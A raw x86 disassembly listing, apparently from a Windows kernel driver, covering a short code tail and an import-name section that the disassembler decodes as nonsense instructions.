   7fc2c:	mov    ds:0x7e528,eax
   7fc31:	not    eax
   7fc33:	mov    ds:0x7e52c,eax
   7fc38:	ret    
   7fc39:	adc    DWORD PTR [esi+0x28],edx
   7fc3c:	ret    0x8b64
   7fc3f:	call   DWORD PTR [ebp-0x75]
   7fc42:	in     al,dx
   7fc43:	call   0x7fc05
   7fc48:	pop    ebp
   7fc49:	jmp    0x191d6
   7fc4e:	int3   
   7fc4f:	int3   
   7fc50:	xchg   esp,eax
   7fc51:	cld    
   7fc52:	push   es
	...
   7fc5b:	add    BYTE PTR [eax+0x80006fe],bl
   7fc61:	lock add BYTE PTR [eax],al
   7fc64:	mov    esp,?
   7fc66:	push   es
	...
   7fc6f:	add    BYTE PTR [edx+0x6fe],bh
   7fc75:	lock add BYTE PTR [eax],al
	...
   7fc8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
   7fc8d:	inc    BYTE PTR [esi]
   7fc8f:	add    BYTE PTR [eax],al
   7fc91:	add    BYTE PTR [eax],al
   7fc93:	add    BYTE PTR [eax],dl
   7fc95:	std    
   7fc96:	push   es
   7fc97:	add    BYTE PTR [edx],bl
   7fc99:	std    
   7fc9a:	push   es
   7fc9b:	add    BYTE PTR [edi*8-0x2d1fffa],ah
   7fca2:	push   es
   7fca3:	add    BYTE PTR [esi],bh
   7fca5:	std    
   7fca6:	push   es
   7fca7:	add    BYTE PTR [esi-0x3],bl
   7fcaa:	push   es
   7fcab:	add    BYTE PTR [edx-0x3],dh
   7fcae:	push   es
   7fcaf:	add    BYTE PTR [ebp+edi*8-0x261fffa],cl
   7fcb6:	push   es
   7fcb7:	add    BYTE PTR [esi-0x27fff903],dh
   7fcbd:	std    
   7fcbe:	push   es
   7fcbf:	add    dl,ah
   7fcc1:	std    
   7fcc2:	push   es
   7fcc3:	add    dh,bh
   7fcc5:	std    
   7fcc6:	push   es
   7fcc7:	add    BYTE PTR [esi],dl
   7fcc9:	inc    BYTE PTR [esi]
   7fccb:	add    BYTE PTR [eax],ah
   7fccd:	inc    BYTE PTR [esi]
   7fccf:	add    BYTE PTR [edx],bh
   7fcd1:	inc    BYTE PTR [esi]
   7fcd3:	add    BYTE PTR [eax-0x2],dl
   7fcd6:	push   es
   7fcd7:	add    BYTE PTR [esi+edi*8+0x6],bl
   7fcdb:	add    BYTE PTR [eax-0x2],dh
   7fcde:	push   es
   7fcdf:	add    BYTE PTR [edx-0x2],bh
   7fce2:	push   es
   7fce3:	add    BYTE PTR [eax-0x7fff902],cl
   7fce9:	cld    
   7fcea:	push   es
   7fceb:	add    al,al
   7fced:	std    
   7fcee:	push   es
   7fcef:	add    dl,al
   7fcf1:	inc    BYTE PTR [esi]
   7fcf3:	add    BYTE PTR [eax],al
   7fcf5:	add    BYTE PTR [eax],al
   7fcf7:	add    BYTE PTR [eax],dh
   7fcf9:	add    ecx,DWORD PTR [edi+0x62]
   7fcfc:	inc    sp
   7fcfe:	gs jb  0x7fd66
   7fd01:	data16 gs jb 0x7fd6a
   7fd05:	outs   dx,BYTE PTR ds:[esi]
   7fd06:	arpl   WORD PTR [ebp+0x4f],sp
   7fd09:	bound  ebp,QWORD PTR [edx+0x65]
   7fd0c:	arpl   WORD PTR [eax+eax*1+0x0],si
   7fd10:	jnp    0x7fd17
   7fd12:	pop    edi
   7fd13:	popa   
   7fd14:	ins    BYTE PTR es:[edi],dx
   7fd15:	ins    BYTE PTR es:[edi],dx
   7fd16:	ins    DWORD PTR es:[edi],dx
   7fd17:	jne    0x7fd85
   7fd19:	add    BYTE PTR [ecx+0x5],bh
   7fd1c:	pop    edi
   7fd1d:	popa   
   7fd1e:	ins    BYTE PTR es:[edi],dx
   7fd1f:	ins    BYTE PTR es:[edi],dx
   7fd20:	imul   esi,DWORD PTR fs:[esi+0x0],0x615f057d
   7fd28:	ins    BYTE PTR es:[edi],dx
   7fd29:	ins    BYTE PTR es:[edi],dx
   7fd2a:	jb     0x7fd91
   7fd2c:	ins    DWORD PTR es:[edi],dx
   7fd2d:	add    BYTE PTR [ebp+0x0],dh
   7fd30:	inc    ebp
   7fd31:	js     0x7fd85
   7fd33:	popa   
   7fd34:	imul   esi,DWORD PTR [ebx+0x65],0x74617453
   7fd3b:	jne    0x7fdb0
   7fd3d:	add    BYTE PTR [edx+0x0],al
   7fd40:	inc    ebp
   7fd41:	js     0x7fd84
   7fd43:	ins    BYTE PTR es:[edi],dx
   7fd44:	ins    BYTE PTR es:[edi],dx
   7fd45:	outs   dx,DWORD PTR ds:[esi]
   7fd46:	arpl   WORD PTR [ecx+0x74],sp
   7fd49:	gs push eax
   7fd4b:	outs   dx,DWORD PTR ds:[esi]
   7fd4c:	outs   dx,DWORD PTR ds:[esi]
   7fd4d:	ins    BYTE PTR es:[edi],dx
   7fd4e:	push   edi
   7fd4f:	imul   esi,DWORD PTR [eax+ebp*2+0x54],0x72506761
   7fd57:	imul   ebp,DWORD PTR [edi+0x72],0x797469
   7fd5e:	dec    esi
   7fd5f:	add    BYTE PTR [ebp+0x78],al
   7fd62:	inc    esi
   7fd63:	jb     0x7fdca
   7fd65:	gs push eax
   7fd67:	outs   dx,DWORD PTR ds:[esi]
   7fd68:	outs   dx,DWORD PTR ds:[esi]
   7fd69:	ins    BYTE PTR es:[edi],dx
   7fd6a:	push   edi
   7fd6b:	imul   esi,DWORD PTR [eax+ebp*2+0x54],0xbd006761
   7fd73:	add    edx,DWORD PTR [edx+0x74]
   7fd76:	ins    BYTE PTR es:[edi],dx
   7fd77:	inc    ebx
   7fd78:	outs   dx,DWORD PTR ds:[esi]
   7fd79:	ins    DWORD PTR es:[edi],dx
   7fd7a:	jo     0x7fddd
   7fd7c:	jb     0x7fde3
   7fd7e:	push   ebp
   7fd7f:	outs   dx,BYTE PTR ds:[esi]
   7fd80:	imul   esp,DWORD PTR [ebx+0x6f],0x74536564
   7fd87:	jb     0x7fdf2
   7fd89:	outs   dx,BYTE PTR ds:[esi]
   7fd8a:	add    BYTE PTR [bp+si+0x2],al
   7fd8e:	dec    ebx
   7fd8f:	gs push edx
   7fd91:	gs ins BYTE PTR es:[edi],dx
   7fd93:	gs popa 
   7fd95:	jae    0x7fdfc
   7fd97:	dec    ebp
   7fd98:	jne    0x7fe0e
   7fd9a:	gs js  0x7fd9d
   7fd9d:	add    BYTE PTR [ebp+0x2],ch
   7fda0:	dec    ebx
   7fda1:	gs push edi
   7fda3:	popa   
   7fda4:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6e695372
   7fdac:	ins    BYTE PTR es:[di],dx
   7fdae:	gs dec edi
   7fdb0:	bound  ebp,QWORD PTR [edx+0x65]
   7fdb3:	arpl   WORD PTR [eax+eax*1-0x57],si
   7fdb7:	add    eax,0x736d656d
   7fdbc:	gs je  0x7fdbf
   7fdbf:	add    BYTE PTR [ecx+0x0],al
   7fdc2:	inc    ebp
   7fdc3:	js     0x7fe06
   7fdc5:	ins    BYTE PTR es:[edi],dx
   7fdc6:	ins    BYTE PTR es:[edi],dx
   7fdc7:	outs   dx,DWORD PTR ds:[esi]
   7fdc8:	arpl   WORD PTR [ecx+0x74],sp
   7fdcb:	gs push eax
   7fdcd:	outs   dx,DWORD PTR ds:[esi]
   7fdce:	outs   dx,DWORD PTR ds:[esi]
   7fdcf:	ins    BYTE PTR es:[edi],dx
   7fdd0:	push   edi
   7fdd1:	imul   esi,DWORD PTR [eax+ebp*2+0x54],0xa7006761
   7fdd9:	add    eax,0x636d656d
   7fdde:	jo     0x7fe59
   7fde0:	add    BYTE PTR [eax],al
   7fde2:	mov    eax,ds:0x476d4d02
   7fde7:	gs je  0x7fe3d
   7fdea:	jns    0x7fe5f
   7fdec:	je     0x7fe53
   7fdee:	ins    DWORD PTR es:[edi],dx
   7fdef:	push   edx
   7fdf0:	outs   dx,DWORD PTR ds:[esi]
   7fdf1:	jne    0x7fe67
   7fdf3:	imul   ebp,DWORD PTR [esi+0x65],0x72646441
   7fdfa:	gs jae 0x7fe70
   7fdfd:	add    bh,al
   7fdff:	add    edx,DWORD PTR [edx+0x74]
   7fe02:	ins    BYTE PTR es:[edi],dx
   7fe03:	inc    ebx
   7fe04:	outs   dx,DWORD PTR ds:[esi]
   7fe05:	jo     0x7fe80
   7fe07:	push   ebp
   7fe08:	outs   dx,BYTE PTR ds:[esi]
   7fe09:	imul   esp,DWORD PTR [ebx+0x6f],0x74536564
   7fe10:	jb     0x7fe7b
   7fe12:	outs   dx,BYTE PTR ds:[esi]
   7fe13:	add    BYTE PTR [bx+si],al
   7fe16:	mov    DWORD PTR ds:0x6e736377,0x746163
   7fe20:	push   es
   7fe21:	add    eax,0x6c41775a
   7fe26:	ins    BYTE PTR es:[edi],dx
   7fe27:	outs   dx,DWORD PTR ds:[esi]
   7fe28:	arpl   WORD PTR [ecx+0x74],sp
   7fe2b:	gs push esi
   7fe2d:	imul   esi,DWORD PTR [edx+0x74],0x4d6c6175
   7fe34:	gs ins DWORD PTR es:[edi],dx
   7fe36:	outs   dx,DWORD PTR ds:[esi]
   7fe37:	jb     0x7feb2
   7fe39:	add    bl,ah
   7fe3b:	add    DWORD PTR [ecx+0x6f],ecx
   7fe3e:	inc    bx
   7fe40:	outs   dx,DWORD PTR ds:[esi]
   7fe41:	ins    DWORD PTR es:[edi],dx
   7fe42:	jo     0x7feb0
   7fe44:	gs je  0x7feac
   7fe47:	push   edx
   7fe48:	gs jno 0x7fec0
   7fe4b:	gs jae 0x7fec2
   7fe4e:	add    BYTE PTR [eax],al
   7fe50:	mov    ecx,0x70777305
   7fe55:	jb     0x7fec0
   7fe57:	outs   dx,BYTE PTR ds:[esi]
   7fe58:	je     0x7fec0
   7fe5a:	add    BYTE PTR [eax],al
   7fe5c:	xor    eax,DWORD PTR [edx]
   7fe5e:	dec    ebx
   7fe5f:	gs push ecx
   7fe61:	jne    0x7fec8
   7fe63:	jb     0x7fede
   7fe65:	push   ebx
   7fe66:	jns    0x7fedb
   7fe68:	je     0x7fecf
   7fe6a:	ins    DWORD PTR es:[edi],dx
   7fe6b:	push   esp
   7fe6c:	imul   ebp,DWORD PTR [ebp+0x65],0x7305ac00
   7fe73:	jo     0x7fee7
   7fe75:	imul   ebp,DWORD PTR [esi+0x74],0x2660066
   7fe7c:	dec    ebx
   7fe7d:	gs push esp
   7fe7f:	imul   esp,DWORD PTR [ebx+0x6b],0x6e756f43
   7fe86:	je     0x7fe88
   7fe88:	test   BYTE PTR [ecx],0x4b
   7fe8b:	gs inc edx
   7fe8d:	jne    0x7fef6
   7fe8f:	inc    ebx
   7fe90:	push   0x456b6365
   7fe95:	js     0x7fe97
   7fe97:	add    BYTE PTR [esi+0x74],ch
   7fe9a:	outs   dx,DWORD PTR ds:[esi]
   7fe9b:	jae    0x7ff08
   7fe9d:	jb     0x7ff0d
   7fe9f:	ins    BYTE PTR es:[edi],dx
   7fea0:	cs gs js 0x7ff09
   7fea4:	add    BYTE PTR [eax],al
   7fea6:	inc    eax
   7fea7:	add    BYTE PTR [ebx+0x65],cl
   7feaa:	inc    edi
   7feab:	gs je  0x7fef1
   7feae:	jne    0x7ff22
   7feb0:	jb     0x7ff17
   7feb2:	outs   dx,BYTE PTR ds:[esi]
   7feb3:	je     0x7fefe
   7feb5:	jb     0x7ff28
   7feb7:	ins    BYTE PTR es:[edi],dx
   7feb8:	add    BYTE PTR [eax],al
   7feba:	dec    eax
   7febb:	inc    ecx
   7febc:	dec    esp
   7febd:	cs fs ins BYTE PTR es:[edi],dx
   7fec0:	ins    BYTE PTR es:[edi],dx
   7fec1:	add    BYTE PTR [eax+0x6c745204],ah
   7fec7:	push   ebp
   7fec8:	outs   dx,BYTE PTR ds:[esi]
   7fec9:	ja     0x7ff34
   7fecb:	outs   dx,BYTE PTR ds:[esi]
   7fecc:	fs
	...
